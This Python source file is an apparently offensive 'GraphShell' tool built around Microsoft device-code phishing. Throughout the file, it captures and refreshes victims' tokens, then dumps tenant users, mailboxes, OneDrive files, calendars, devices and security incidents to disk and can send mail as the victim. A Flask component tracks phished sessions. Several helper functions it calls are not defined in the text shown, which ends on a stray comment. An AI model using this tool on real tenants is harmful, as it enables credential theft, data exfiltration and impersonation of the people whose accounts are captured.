import requests
import time
import jwt
import cmd
import json
import threading
import sqlite3
from flask import Flask, request, jsonify
from flask_cors import CORS
from termcolor import colored
import base64

app = Flask(__name__)
CORS(app)  # This will enable CORS for all routes
sessions = {}

class GraphShell(cmd.Cmd):
    prompt = colored(">> ", "light_magenta")
    intro = colored("Welcome to the GraphShell! Type ? or help to list commands", "light_cyan")

    def __init__(self):
        super().__init__()
        self.access_token = None
        self.refresh_token = None
        self.token_details = None
        self.current_session = None

    def emptyline(self):
        pass  # Override to do nothing on empty input line

    def do_generate_device_code(self, arg):
        """Generate device code and poll for authorization: generate_device_code"""
        auth_response = get_device_code()
        if auth_response:
            user_code = auth_response['user_code']
            print(f"User code: {user_code}")
            print("Please visit", colored("https://microsoft.com/devicelogin", "blue"), "and enter the user code.")
            # self.current_session = user_code # automatically update the current session to the generated session
            sessions[user_code] = {'device_code': auth_response['device_code'], 'status': 'Not Authenticated'}
            poll_thread = threading.Thread(target=self.poll_for_authorization, args=(auth_response,))
            poll_thread.daemon = True
            poll_thread.start()

    def poll_for_authorization(self, auth_response):
        auth_result = poll_for_authorization(auth_response)
        session_id = auth_response['user_code']
        if auth_result:
            update_session_with_auth_result(session_id, auth_result)
            if self.current_session == session_id:
                self.access_token = auth_result['access_token']
                self.refresh_token = auth_result['refresh_token']
                self.token_details = auth_result
            print(colored(f"\n[*] Authentication successful for session {session_id}!", "green"))
        else:
            sessions[session_id]['status'] = 'Authorization failed or timed out'
            print(colored(f"\n[-] Authentication failed or timed out for session {session_id}!", "red"))

    def do_start_server(self, arg):
        """Start the Flask web server: start_server [port] [ssl]"""
        args = arg.split()
        port = 5000  # Default port
        ssl = False  # Default SSL setting

        if len(args) > 0:
            try:
                port = int(args[0])
            except ValueError:
                print(colored("Invalid port number. Using default port 5000.", "red"))
            if len(args) > 1 and args[1].lower() == 'ssl':
                ssl = True

        print(colored(f"Starting server on port {port} {'with SSL' if ssl else 'without SSL'}...", "green"))
        start_flask_app(port=port, ssl=ssl)


    def do_enum_users(self, arg):
        """Enumerate users: enum_users"""
        if self.access_token:
            enumerate_users(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_planner_plans(self, arg):
        """List Planner plans: list_planner_plans"""
        if self.access_token:
            list_planner_plans(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_teams(self, arg):
        """List teams: list_teams"""
        if self.access_token:
            list_teams(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_channels(self, arg):
        """List channels in a team: list_channels <team_id>"""
        if self.access_token:
            if not arg:
                print(colored("Team ID is required. Usage: list_channels <team_id>", "red"))
            else:
                list_channels(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_onenote_notebooks(self, arg):
        """List OneNote notebooks: list_onenote_notebooks"""
        if self.access_token:
            list_onenote_notebooks(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_onenote_sections(self, arg):
        """List sections in a OneNote notebook: list_onenote_sections <notebook_id>"""
        if self.access_token:
            if not arg:
                print(colored("Notebook ID is required. Usage: list_onenote_sections <notebook_id>", "red"))
            else:
                list_onenote_sections(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_managed_devices(self, arg):
        """List managed devices: list_managed_devices"""
        if self.access_token:
            list_managed_devices(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_managed_device_details(self, arg):
        """Get details of a specific managed device: get_managed_device_details <device_id>"""
        if self.access_token:
            if not arg:
                print(colored("Device ID is required. Usage: get_managed_device_details <device_id>", "red"))
            else:
                get_managed_device_details(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_security_incidents(self, arg):
        """List security incidents: list_security_incidents"""
        if self.access_token:
            list_security_incidents(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_security_incident_details(self, arg):
        """Get details of a specific security incident: get_security_incident_details <incident_id>"""
        if self.access_token:
            if not arg:
                print(colored("Incident ID is required. Usage: get_security_incident_details <incident_id>", "red"))
            else:
                get_security_incident_details(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_service_principals(self, arg):
        """List service principals: list_service_principals"""
        if self.access_token:
            list_service_principals(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_service_principal_details(self, arg):
        """Get details of a specific service principal: get_service_principal_details <servicePrincipal_id>"""
        if self.access_token:
            if not arg:
                print(colored("Service Principal ID is required. Usage: get_service_principal_details <servicePrincipal_id>", "red"))
            else:
                get_service_principal_details(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_enum_groups(self, arg):
        """Enumerate groups: enum_groups"""
        if self.access_token:
            enumerate_groups(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_enum_devices(self, arg):
        """Enumerate devices: enum_devices"""
        if self.access_token:
            enumerate_devices(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_device_details(self, arg):
        """Get details of a specific device: get_device_details <device_id>"""
        if self.access_token:
            if not arg:
                print(colored("Device ID is required. Usage: get_device_details <device_id>", "red"))
            else:
                get_device_details(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_dump_email(self, arg):
        """Dump emails: dump_email"""
        if self.access_token:
            dump_emails(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_user_details(self, arg):
        """Get details of a specific user: get_user_details <user_id>"""
        if self.access_token:
            if not arg:
                print(colored("User ID is required. Usage: get_user_details <user_id>", "red"))
            else:
                get_user_details(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_group_members(self, arg):
        """Get members of a specific group: get_group_members <group_id>"""
        if self.access_token:
            if not arg:
                print(colored("Group ID is required. Usage: get_group_members <group_id>", "red"))
            else:
                get_group_members(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_user_manager(self, arg):
        """Get the manager of a specific user: get_user_manager <user_id>"""
        if self.access_token:
            if not arg:
                print(colored("User ID is required. Usage: get_user_manager <user_id>", "red"))
            else:
                get_user_manager(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_user_direct_reports(self, arg):
        """Get the direct reports of a specific user: get_user_direct_reports <user_id>"""
        if self.access_token:
            if not arg:
                print(colored("User ID is required. Usage: get_user_direct_reports <user_id>", "red"))
            else:
                get_user_direct_reports(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_user_events(self, arg):
        """Get calendar events of a specific user: get_user_events <user_id>"""
        if self.access_token:
            if not arg:
                print(colored("User ID is required. Usage: get_user_events <user_id>", "red"))
            else:
                get_user_events(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_get_user_contacts(self, arg):
        """Get contacts of a specific user: get_user_contacts <user_id>"""
        if self.access_token:
            if not arg:
                print(colored("User ID is required. Usage: get_user_contacts <user_id>", "red"))
            else:
                get_user_contacts(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_dump_mail_ids(self, arg):
        """Dump email addresses of all users: dump_mail_ids"""
        if self.access_token:
            dump_mail_ids(self.access_token)
        else:
            print(colored("Please authenticate first using generate_device_code", "red"))
    
    def do_dump_user_names(self, arg):
        """Dump names of all users: dump_user_names"""
        if self.access_token:
            dump_user_names(self.access_token)
        else:
            print(colored("Please authenticate first using generate_device_code", "red"))

    def do_get_user_drive_files(self, arg):
        """Get files in a user's OneDrive: get_user_drive_files <user_id>"""
        if self.access_token:
            if not arg:
                print(colored("User ID is required. Usage: get_user_drive_files <user_id>", "red"))
            else:
                get_user_drive_files(self.access_token, arg)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_list_shared_files(self, arg):
        """List files shared with the current user: list_shared_files"""
        if self.access_token:
            list_shared_files(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_download_file(self, arg):
        """Download a file from OneDrive: download_file <user_id> <item_id> <local_path>"""
        if self.access_token:
            args = arg.split()
            if len(args) != 3:
                print(colored("Usage: download_file <user_id> <item_id> <local_path>", "red"))
            else:
                user_id, item_id, local_path = args
                download_file(self.access_token, user_id, item_id, local_path)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_upload_file(self, arg):
        """Upload a file to OneDrive: upload_file <user_id> <local_path> <drive_path>"""
        if self.access_token:
            args = arg.split()
            if len(args) != 3:
                print(colored("Usage: upload_file <user_id> <local_path> <drive_path>", "red"))
            else:
                user_id, local_path, drive_path = args
                upload_file(self.access_token, user_id, local_path, drive_path)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_send_email(self, arg):
        """Send an email: send_email <recipient_email> <subject> <email_content>"""
        if self.access_token:
            import shlex
            try:
                args = shlex.split(arg)
                if len(args) != 3:
                    print(colored("Usage: send_email <recipient_email> <subject> <email_content>", "red"))
                else:
                    recipient_email, subject, email_content = args
                    send_email(self.access_token, recipient_email, subject, email_content)
            except ValueError as ve:
                print(colored(f"Argument parsing error: {ve}", "red"))
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_token_permissions(self, arg):
        """Print token permissions: token_permissions"""
        if self.access_token:
            permissions = get_permissions(self.access_token)
            print(colored("Token Permissions:", "blue"))
            print(permissions)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_token_details(self, arg):
        """Print token details: token_details"""
        if self.token_details:
            print(colored("Token Details:", "blue"))
            print(json.dumps(self.token_details, indent=4))
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_print_access_token(self, arg):
        """Print the current access token: print_access_token"""
        if self.access_token:
            print(colored("Current Access Token:", "blue"))
            print(self.access_token)
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def do_refresh_access_token(self, arg):
        """Refresh the access token: refresh_access_token"""
        if self.refresh_token:
            new_access_token = refresh_access_token(self.refresh_token)
            if new_access_token:
                self.access_token = new_access_token
                sessions[self.current_session]['access_token'] = self.access_token
                print(colored("[+] Access token refreshed successfully!", "green"))
        else:
            print(colored("[-] No Active Session Found.", "red"))

    def check_token_validity(self, access_token):
        try:
            # Check if the token is still valid by making a simple API call
            response = requests.get('https://graph.microsoft.com/v1.0/me', headers={'Authorization': 'Bearer ' + access_token})
            if response.status_code == 401:
                return False
            return True
        except Exception as e:
            print(colored(f"An error occurred while checking token validity: {e}", "red"))
            return False

    def do_sessions(self, arg):
        """List all active sessions: sessions"""
        if sessions:
            print(colored("[+] Active Sessions:", "green"))
            for session_id, session_data in sessions.items():
                if 'access_token' in session_data:
                    if not self.check_token_validity(session_data['access_token']):
                        session_data['status'] = 'Expired'
                auth_status = colored("Authenticated", "green") if session_data.get('status') == 'Authenticated' else colored("Expired", "red") if session_data.get('status') == 'Expired' else colored("Not Authenticated", "yellow")
                user_info = session_data.get('user_email', session_data.get('user_display_name', 'N/A')) if 'access_token' in session_data else 'N/A'
                current_marker = colored("<-- (Current Session)", "magenta") if session_id == self.current_session else ""
                print(f"Session ID: {session_id}, User: {user_info}, Status: {auth_status} {current_marker}")
                print()
        else:
            print(colored("No active sessions found.", "red"))


    def do_interact(self, arg):
        """Interact with a specific session: interact <session_id>"""
        if arg in sessions:
            session_data = sessions[arg]
            if 'access_token' in session_data:
                self.current_session = arg
                self.access_token = session_data.get('access_token')
                self.refresh_token = session_data.get('refresh_token')
                self.token_details = session_data.get('token_details')
                self.prompt = colored(f"({arg}) >> ", "blue")
                print(colored(f"Interacting with session {arg}", "green"))
            else:
                print(colored(f"Session {arg} is not authenticated yet.", "red"))
        else:
            print(colored("Invalid session ID. Use 'sessions' to list active sessions.", "red"))

    def do_delete_session(self, arg):
        """Delete a specific session: delete_session <session_id>"""
        if arg in sessions:
            del sessions[arg]
            print(colored(f"Session {arg} has been deleted.", "green"))

            # If the current session is deleted, reset the current session and prompt
            if self.current_session == arg:
                self.current_session = None
                self.access_token = None
                self.refresh_token = None
                self.token_details = None
                self.prompt = colored(">> ", "blue")
        else:
            print(colored("Invalid session ID. Use 'sessions' to list active sessions.", "red"))


    def do_load_db(self, arg):
        """Load sessions from the specified database: load_db <db_name>"""
        if arg:
            load_sessions_from_db(arg)
            print(colored(f"Sessions loaded from database {arg}", "green"))
        else:
            print(colored("Database name is required. Usage: load_db <db_name>", "red"))

    def do_exit(self, arg):
        """Exit the shell: exit"""
        print(colored("Exiting...", "yellow"))
        return True

def get_device_code():
    body = {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "resource": "https://graph.microsoft.com"
    }
    response = requests.post("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0", data=body)
    auth_response = response.json()
    return auth_response

def get_user_profile(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/me'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        return response.json()
    else:
        print(colored('[!] Failed to get user profile information', 'red'))
        return None
    
def dump_mail_ids(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/users'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        users = response.json().get('value', [])
        with open('emails_dump.txt', 'w') as f:
            for user in users:
                email = user.get('mail', 'N/A')
                f.write(email + '\n')
        print(colored('[+] Email addresses dumped to emails_dump.txt', 'green'))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def dump_user_names(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/users'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        users = response.json().get('value', [])
        with open('names_dump.txt', 'w') as f:
            for user in users:
                name = user.get('displayName', 'N/A')
                f.write(name + '\n')
        print(colored('[+] User names dumped to names_dump.txt', 'green'))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def get_group_members(token, group_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/groups/{group_id}/members'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        members = response.json().get('value', [])
        print(colored('[+] Group Members:', 'green'))
        for member in members:
            print(f"Name: {member['displayName']}, ID: {member['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def list_planner_plans(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/planner/plans'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        plans = response.json().get('value', [])
        print(colored('[+] Planner Plans:', 'green'))
        for plan in plans:
            print(f"Title: {plan['title']}, ID: {plan['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_teams(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/teams'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        teams = response.json().get('value', [])
        print(colored('[+] Teams:', 'green'))
        for team in teams:
            print(f"Name: {team['displayName']}, ID: {team['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_channels(token, team_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/teams/{team_id}/channels'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        channels = response.json().get('value', [])
        print(colored('[+] Channels:', 'green'))
        for channel in channels:
            print(f"Name: {channel['displayName']}, ID: {channel['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_onenote_notebooks(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/me/onenote/notebooks'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        notebooks = response.json().get('value', [])
        print(colored('[+] OneNote Notebooks:', 'green'))
        for notebook in notebooks:
            print(f"Name: {notebook['displayName']}, ID: {notebook['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_onenote_sections(token, notebook_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/me/onenote/notebooks/{notebook_id}/sections'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        sections = response.json().get('value', [])
        print(colored('[+] OneNote Sections:', 'green'))
        for section in sections:
            print(f"Name: {section['displayName']}, ID: {section['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_managed_devices(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/deviceManagement/managedDevices'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        devices = response.json().get('value', [])
        print(colored('[+] Managed Devices:', 'green'))
        for device in devices:
            print(f"Name: {device['deviceName']}, ID: {device['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def get_managed_device_details(token, device_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/deviceManagement/managedDevices/{device_id}'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        device_details = response.json()
        print(colored('[+] Managed Device Details:', 'green'))
        print(json.dumps(device_details, indent=4))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_security_incidents(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/security/incidents'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        incidents = response.json().get('value', [])
        print(colored('[+] Security Incidents:', 'green'))
        for incident in incidents:
            print(f"Title: {incident['title']}, ID: {incident['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def get_security_incident_details(token, incident_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/security/incidents/{incident_id}'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        incident_details = response.json()
        print(colored('[+] Security Incident Details:', 'green'))
        print(json.dumps(incident_details, indent=4))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def list_service_principals(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/servicePrincipals'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        service_principals = response.json().get('value', [])
        print(colored('[+] Service Principals:', 'green'))
        for principal in service_principals:
            print(f"Name: {principal['displayName']}, ID: {principal['id']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")


def get_service_principal_details(token, principal_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/servicePrincipals/{principal_id}'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }
    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        principal_details = response.json()
        print(colored('[+] Service Principal Details:', 'green'))
        print(json.dumps(principal_details, indent=4))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def poll_for_authorization(auth_response):
    continue_auth = True
    interval = int(auth_response['interval'])
    expires = int(auth_response['expires_in'])
    total = 0

    auth_body = {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "code": auth_response['device_code'],
        "resource": "https://graph.microsoft.com"
    }

    while continue_auth:
        time.sleep(interval)
        total += interval

        if total > expires:
            print(colored("Timeout occurred", "red"))
            return None
        
        try:
            response = requests.post("https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0", data=auth_body)
            if response.status_code == 200:
                auth_result = response.json()
                return auth_result
            else:
                details = response.json()
                continue_auth = details['error'] == "authorization_pending"
                if not continue_auth:
                    print(colored(details['error_description'], "red"))
                    return None
        except Exception as e:
            print(colored(f"An error occurred: {e}", "red"))
            return None

def refresh_access_token(refresh_token):
    body = {
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "grant_type": "refresh_token",
        "refresh_token": refresh_token,
        "resource": "https://graph.microsoft.com"
    }
    response = requests.post("https://login.microsoftonline.com/common/oauth2/token?api-version=1.0", data=body)
    if response.status_code == 200:
        auth_result = response.json()
        return auth_result['access_token']
    else:
        print(colored('[!] Failed to refresh access token', 'red'))
        print(f"Error details: {response.json()}")
        return None

def get_permissions(token):
    token_payload = jwt.decode(token, options={"verify_signature": False})
    scopes = token_payload.get('scp', 'No scopes found')
    return scopes

def dump_emails(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/me/messages'
    msgraph_headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
        'Authorization': 'Bearer ' + token
    }

    getemails_response = requests.get(msgraph_url, headers=msgraph_headers)

    if getemails_response.status_code == 200:
        email_content = getemails_response.text
        print(colored('[+] Writing emails to file: email.txt', 'green'))
        with open('email.txt', 'w') as f:
            f.write(email_content)
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {getemails_response.json()}")

def enumerate_users(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/users'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        users = response.json().get('value', [])
        print(colored('[+] Users:', 'green'))
        for user in users:
            print(f"ID: {user['id']}, Name: {user['displayName']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def enumerate_groups(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/groups'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        groups = response.json().get('value', [])
        print(colored('[+] Groups:', 'green'))
        for group in groups:
            print(f"ID: {group['id']}, Name: {group['displayName']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def enumerate_devices(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/devices'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        devices = response.json().get('value', [])
        print(colored('[+] Devices:', 'green'))
        for device in devices:
            print(f"ID: {device['id']}, Name: {device['displayName']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_device_details(token, device_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/devices/{device_id}'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        device_details = response.json()
        print(colored('[+] Device details:', 'green'))
        print(json.dumps(device_details, indent=4))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_user_details(token, user_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        user_details = response.json()
        print(colored('[+] User details:', 'green'))
        print(json.dumps(user_details, indent=4))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_user_manager(token, user_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/manager'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        manager = response.json()
        print(colored('[+] User manager:', 'green'))
        print(json.dumps(manager, indent=4))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_user_direct_reports(token, user_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/directReports'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        direct_reports = response.json().get('value', [])
        print(colored('[+] Direct reports:', 'green'))
        for report in direct_reports:
            print(f"ID: {report['id']}, Name: {report['displayName']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_user_events(token, user_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/events'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        events = response.json().get('value', [])
        print(colored('[+] Calendar events:', 'green'))
        for event in events:
            print(f"ID: {event['id']}, Subject: {event['subject']}, Start: {event['start']['dateTime']}, End: {event['end']['dateTime']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_user_contacts(token, user_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/contacts'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        contacts = response.json().get('value', [])
        print(colored('[+] Contacts:', 'green'))
        for contact in contacts:
            print(f"ID: {contact['id']}, Name: {contact['displayName']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def get_user_drive_files(token, user_id):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/drive/root/children'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        files = response.json().get('value', [])
        print(colored('[+] OneDrive files:', 'green'))
        for file in files:
            print(f"ID: {file['id']}, Name: {file['name']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def list_shared_files(token):
    msgraph_url = 'https://graph.microsoft.com/v1.0/me/drive/sharedWithMe'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers)
    if response.status_code == 200:
        shared_files = response.json().get('value', [])
        print(colored('[+] Shared Files:', 'green'))
        for file in shared_files:
            print(f"Name: {file['name']}, ID: {file['id']}, Last Modified: {file['lastModifiedDateTime']}")
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def download_file(token, user_id, item_id, local_path):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/drive/items/{item_id}/content'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token
    }

    response = requests.get(msgraph_url, headers=msgraph_headers, stream=True)
    if response.status_code == 200:
        with open(local_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        print(colored(f'[+] File downloaded successfully to {local_path}', 'green'))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        print(f"Error details: {response.json()}")

def upload_file(token, user_id, local_path, drive_path):
    msgraph_url = f'https://graph.microsoft.com/v1.0/users/{user_id}/drive/root:/{drive_path}:/content'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/octet-stream'
    }

    with open(local_path, 'rb') as file:
        response = requests.put(msgraph_url, headers=msgraph_headers, data=file)
        if response.status_code == 200:
            print(colored('[+] File uploaded successfully!', 'green'))
        else:
            print(colored('[!] Something went wrong...', 'red'))
            print(f"Error details: {response.json()}")

def send_email(token, recipient_email, subject, email_content):
    msgraph_url = 'https://graph.microsoft.com/v1.0/me/sendMail'
    msgraph_headers = {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }

    email_body = {
        "message": {
            "subject": subject,
            "body": {
                "contentType": "HTML",
                "content": f"<html><body>{email_content}</body></html>"
            },
            "toRecipients": [
                {
                    "emailAddress": {
                        "address": recipient_email
                    }
                }
            ]
        },
        "saveToSentItems": "true"
    }

    response = requests.post(msgraph_url, headers=msgraph_headers, data=json.dumps(email_body))
    if response.status_code == 202:
        print(colored('[+] Email sent successfully! But most likely not delivered', 'green'))
    else:
        print(colored('[!] Something went wrong...', 'red'))
        error_details = response.json()
        if 'error' in error_details and 'message' in error_details['error']:
            print(colored(f"Error: {error_details['error']['message']}", 'red'))
        else:
            print(f"Error details: {error_details}")

# old code urlencoded data https://0.0.0.0:5000/start_session?<urlencoded session data>
# @app.route('/start_session', methods=['POST', 'GET'])
# def start_session():
#     if request.method == 'POST':
#         session_data = request.get_json()
#     else:
#         session_data = {key: unquote(value) for key, value in request.args.items()}

#     session_id = session_data['user_code']
#     sessions[session_id] = {
#         'device_code': session_data['device_code'],
#         'user_code': session_data['user_code'],
#         'verification_url': session_data['verification_url'],
#         'expires_in': session_data['expires_in'],
#         'interval': session_data['interval'],
#         'message': session_data['message'],
#         'status': 'Not Authenticated'
#     }
#     poll_thread = threading.Thread(target=poll_for_authorization_server, args=(session_id, session_data))
#     poll_thread.daemon = True
#     poll_thread.start()
#     return jsonify({'status': 'Session started', 'session_id': session_id}), 200

# sending session data as base64 encoded value
